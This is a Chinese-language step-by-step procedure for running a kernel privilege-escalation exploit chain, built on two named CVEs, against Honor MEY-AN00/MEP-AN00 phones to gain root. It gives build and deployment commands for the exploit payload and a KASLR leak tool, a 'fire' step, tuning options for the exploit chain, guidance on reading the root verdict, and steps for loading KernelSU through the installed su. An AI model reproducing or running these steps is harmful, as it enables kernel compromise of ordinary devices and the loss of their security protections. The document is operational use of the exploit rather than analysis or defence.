# 真机在线验证 SOP（Honor MEY-AN00 / MEP-AN00 · kernel 6.6.118）

> 目标：在真机上按阶段验证 CVE-2026-43499（写原语）+ CVE-2026-64560（读原语），
> 每一步都产出**可直接粘贴**的结构化日志，失败时能定位到具体阶段。
>
> 两条路线，**任选其一**（推荐 A，免接线）：
> - **A. 免接线**：手机装 Shizuku（无线调试启动）+ 装我们写的验证器 APK
> - **B. 接线**：USB 调试 + `adb push` + `adb shell sh ...`

---

## 0. 开工前的三条铁律

1. **一个 boot 只打一发**。写原语会扰动内核 PI 树，同 boot 第二发**必崩**。
   脚本用 `boot_id` 写 `/data/local/tmp/mey/run.lock` 强制拦截，重复跑会打印
   `ALREADY_RAN_THIS_BOOT` 并自动放弃。要再打：**重启手机**。
2. **uptime < 90s 不开火**。boot 期分配器抖动会让命中率归零，脚本会自动等待。
3. **先拿基线再调参**。第一次跑不要动任何旋钮（`$RD/OPTS` 保持全注释）。

---

## 方案 A：免接线（Shizuku + APK）★ 推荐

### A1. 启动 Shizuku（一次性）

1. 手机装 Shizuku（`moe.shizuku.privileged.api`，Google Play / GitHub 均可）。
2. 开发者选项 → **无线调试** → 打开 → 「使用配对码配对设备」→ 按 Shizuku 提示完成配对。
3. Shizuku 界面显示「Shizuku 正在运行」即成功。
   - 电脑端备用启动法（无线调试已开时）：
     `adb shell sh /storage/emulated/0/Android/data/moe.shizuku.privileged.api/start.sh`
4. 之后**可以拔线**，Shizuku 保持 `shell(uid 2000)` 授权给已授权 App。

### A2. 装 APK（已经编译好，直接装）

**现成产物：`D:\MEY-AN00-root-repro\MEY-verifier-debug.apk`**（3.4 MB，debug 签名，可直接安装）

```bash
adb install -r MEY-verifier-debug.apk     # 或拷到手机点开安装
```

APK 内已打包 `assets/kit/`：

| 文件 | 说明 |
|---|---|
| `preload.so`（174 KB, arm64） | ★ exploit 本体，NDK r27c 编译（APP_PAYLOAD=1） |
| `kaslr_leak` | KASLR 泄露工具 |
| `mey_online_check.sh` | 分阶段验证脚本 |
| `OPTS` | 旋钮表（默认全注释） |

装好后点 ② 部署 kit 会把它们释放到 `/data/local/tmp/mey` 并 chmod。

**自行重建**（可选，需 JDK17 + Android SDK，环境已在本机搭好）：
```bash
export JAVA_HOME="<HOME>/.workbuddy/binaries/jdk/jdk-17.0.20.1+1"
export ANDROID_SDK_ROOT="<HOME>/.workbuddy/binaries/android"
export GRADLE_USER_HOME="<HOME>/.workbuddy/binaries/gradle/home"
cd android/ShizukuVerifier
<HOME>/.workbuddy/binaries/gradle/gradle-8.9/bin/gradle assembleDebug
```

> **注意**：standalone PIE 路线当前**不可用** —— dc15 源码在 `APP_PAYLOAD=0` 下
> `chain.c` 会引用只在 `APP_PAYLOAD=1` 声明的 `slide_bank_parents`，编不过。
> 这套源码只有 app payload 一条路，产物就是 `preload.so`。APK 里的
> 「standalone」选项保留着，但会提示未打包 `libcve43499.so`。

### A3. 手机上点（按钮即 SOP）

| # | 按钮 | 做什么 | 安全 |
|---|---|---|---|
| ① | Shizuku 授权 | 校验 binder + 申请授权 | 只读 |
| ② | 部署 kit | 释放二进制到 `/data/local/tmp/mey` 并 chmod | 只读 |
| ③ | 环境指纹 | 机型/内核/SELinux 域/设备节点可达性/KASLR 暴露面 | 只读 |
| ④ | KASLR 泄露 | 跑 `kaslr_leak` 拿 `KASLR_BASE` | 只读 |
| ⑤ | ★ 开火 | 一 boot 一发（长按切路线） | **会崩** |
| ⑥ | 回收日志 | logcat -b kernel / kmsg / pstore / tombstone / dropbox | 只读 |

开火后会自动追加一次日志回收。判定看日志里的 `MEY_VERDICT: ROOT|MISS` 与 diag 里的 `root=1`。

### A3-bis. ① 点完应该看到什么（执行通道自检）

点 ① 授权成功后，App 会自动探测并打印**执行通道**。正常输出应类似：

```
[Shizuku] grantResult=0 (GRANTED)
[KV] api_version=13
[KV] server_uid=2000                    ← 2000 = adb 方式启动；0 = root 方式
[KV] server_selinux_ctx=u:r:shell:s0
[KV] exec_mode=newProcess(直接 AIDL)     ← 必须是这一条
[KV] remote_id=uid=2000(shell) gid=2000(shell) ... context=u:r:shell:s0
[OK] 主通道就绪：IShizukuService#newProcess
--- id ---            uid=2000(shell) gid=2000(shell) groups=2000(shell),1007(log),...
--- selinux ctx ---   u:r:shell:s0
--- /data/local/tmp ---  drwxrwx--x ... shell shell
--- /dev/fmps ---     crw-rw-rw- ... (存在即好)
--- selinuxfs ---     1            (=enforcing)
```

若 `exec_mode=` 显示 `UserService(绑定)`，说明主通道不可用（Shizuku 服务端太新/
裁掉了 `newProcess`），App 会自动改走 `bindUserService` 备通道；此时若仍连不上，
把日志粘回来。

### A4. 取回日志

- **⑧ 导出日志到「下载」目录** → 手机「文件管理 → 下载」里直接出现
  `MEY-verifier-<时间戳>.txt`（走 MediaStore，Android 10+ 无需存储权限）
- **复制全部** → 直接粘贴
- **分享日志** → 微信/邮件发 `mey-report-<时间戳>.txt`
- 或 `adb pull /data/local/tmp/mey/report-*.txt`

### A4-bis. 开火把手机打崩/打重启后怎么拿日志 ★

App 从启动起就把**每一行**实时写到 sdcard，写一行 `flush()` + `fsync()` 落闪存，
所以内核 panic / 自动关机 / 手动拔电池都不会丢（这是上一版丢日志的根因）。

```
/sdcard/Android/data/com.mey.verifier/files/mey-live-<启动时间戳>.txt
```

- 开火后手机重启 → 重新打开 App，日志区顶部会打印
  `历史日志=/sdcard/Android/data/.../mey-live-<上一发>.txt (N 字节)`，
  按时间倒序列最近 5 份，直接照路径去取。
- 同一个目录里还有开火产物：`diag.txt`（SLIDE 诊断）和 `rootproof.txt`（`id` 输出）。
  这两个也刻意放在 sdcard 侧，写进 `/data/data/...` 内部目录重启后用户取不出来。
- 某些第三方文件管理器不显示 `Android/data` → 用系统自带的「文件管理」，
  或者用新加的 ⑧ 按钮导出到「下载」。
- App 自身若被杀，崩溃栈会写进同一份实时日志（末尾 `[CRASH]` 段）。

---

## 方案 B：接线 adb（不用 APK）

```bash
# 1) 编译（NDK r27+ 即可）
cd exploit-src
NDK=/path/to/android-ndk-r27c ./build_ndk.sh        # → build/cve43499, build/preload.so

# 2) 部署
adb push build/preload.so build/cve43499 ../tools/kaslr_leak ../tools/mey_online_check.sh /data/local/tmp/mey/
adb shell chmod 755 /data/local/tmp/mey/cve43499 /data/local/tmp/mey/kaslr_leak /data/local/tmp/mey/mey_online_check.sh

# 3) 分阶段验证
adb shell sh /data/local/tmp/mey/mey_online_check.sh env    # 指纹
adb shell sh /data/local/tmp/mey/mey_online_check.sh leak   # KASLR
adb shell sh /data/local/tmp/mey/mey_online_check.sh fire --yes   # 开火（一 boot 一发）

# 4) 取日志
adb pull /data/local/tmp/mey/
adb shell logcat -b kernel -d > kernel.log
```

> 注意：adb 直跑时你的域是 `u:r:shell:s0`，**standalone PIE 路线的 `/dev/fmps` 会 EPERM**，
> 这是预期现象。shell 下请用默认的 **LD_PRELOAD 载体路线**（与上游 `mep_run.sh` 一致）；
> 要在 untrusted_app 域跑 standalone，请用方案 A（长按开火按钮切 `standalone`）。

---

## 1. 判读要点

**③ 环境指纹**里这几行最关键：

```
[KV] kernel_release=6.6.118-android15-8-gf17133276a57-...   ← 必须是 6.6.118
[KV] device=...MEY-AN00 / MEP-AN00                          ← 机型命中
[KV] selinux_context=u:r:untrusted_app_64:s0:...|u:r:shell:s0
[KV] node=/dev/fmps perm=... err=[...]                       ← 看 open 的真实 errno
[KV] REF_*                                                   ← 离线推导值，供比对
```

**⑤ 开火**后看：

```
[STAGE] fire end rc=0
[OK] MEY_VERDICT: ROOT            ← 拿到 root
[WARN] MEY_VERDICT: MISS          ← 本 boot 未命中，重启重来（正常，命中率本就 25~30%）
[FAIL] 检出内核异常关键字           ← 崩了，看 tombstone/pstore
```

拿到 root 后（上游配方）：
- exploit 装的 su 在 **`/data/local/tmp/su`**（不在 PATH，用全路径调用）
- 如需 KernelSU：`/data/local/tmp/su -c "<libksud.so路径> late-load --allow-shell --package-name me.weishu.kernelsu"`

---

## 2. 调参不改代码

改手机上的 `/data/local/tmp/mey/OPTS`（每行 `KEY=VALUE`，`#` 注释），脚本自动 export：

| 旋钮 | 作用 |
|---|---|
| `USE_SIGRETURN=0` | 回退旧 fmps 载体（默认 1 = sigreturn 载体） |
| `GW_CHAIN=1` | 绕开 fops 循环直跑 cred 链（该步实测约 37% 阵亡） |
| `SELINUX_ROUTE=1` / `BRIDGE_ROUTE=1` | 换写目标（实验性） |
| `SLIDE_SPIN_BURST=1` | **必须单发**，>1 会在 RB_CLEAR_NODE 节点重跑 rb_erase ⇒ 必崩 |
| `EXPLOIT_ATTEMPTS` / `*_DELAY_USEC` / `SLIDE_FMPS_ATTEMPTS` | 时序微调 |
| `P0_ORACLE_DIAG=1` / `SLIDE_DIAG=1` | 诊断输出（脚本已强制开 SLIDE_DIAG） |

---

## 3. 常见失败速查

| 现象 | 原因 | 处理 |
|---|---|---|
| `ALREADY_RAN_THIS_BOOT` | 本 boot 已开火 | 重启手机（或删 `run.lock`，不推荐） |
| `LEAK_FAIL` / 无 `KASLR_BASE` | `kaslr_leak` 不适配 | 可忽略，exploit 有内置 P0 oracle |
| `open /dev/fmps: Permission denied` | SELinux 域不对 | shell 域用 LD_PRELOAD 路线；standalone 必须 app 域（用 APK） |
| `fire end rc=124` | 超时（900s） | 卡在 pselect/等待队列，重启后调 `PSELECT_DELAY_USEC` |
| `fire end rc=139` | 用户态 SIGSEGV | 看 tombstone，多半是偏移不对 |
| 开火后重启 | 内核 panic | 正常失败态；取 pstore/last_kmsg 分析 |
| ~~`[X] ShellService 绑定失败`~~ | **已修复**：旧版用 `bindUserService` 起进程，在 Android 16 上回调不来 | 新版改走 `IShizukuService#newProcess`（直接 AIDL，无需绑定）。升级 APK 即可 |
| `exec_mode=UserService(绑定)` | 主通道 `newProcess` 被服务端裁掉 | 用备通道；仍失败则贴日志 |
| Shizuku「未运行」 | 无线调试没启动 | 重开无线调试，或用电脑端 start.sh |
| APK 装不上 | 与旧包签名冲突 | 卸载旧包再装（本包 `com.mey.verifier`，与 `com.ghostlock.ksu` 不冲突） |

---

## 4. 参考：上游配方差本

参考 APK `ksu-cga-release-1.2.13.apk`（包名 `com.ghostlock.ksu`）里的
`assets/mep/mep_run.sh`、`assets/kit/dc_ksu_run.sh` 是本 SOP 的事实基准，
已解包到 `reference/ksu-cga-1.2.13/` 供对照。关键差异：

| 项 | 上游（CGA/MEP, dc14） | 本项目（MEY, dc15） |
|---|---|---|
| target.h | CGA-W00 6.1.157 | `target_mey_an00.h`（6.6.118 偏移） |
| 载体 | `preload.so`（dc14） | dc15 重编的 `preload.so` / `cve43499` |
| 判定 | diag 里 `root=1` | 同，另加 `MEY_VERDICT` |
| 一发锁 | `run.lock`(boot_id) | 同 |
| uptime gate | ≥90~95s | ≥90s |
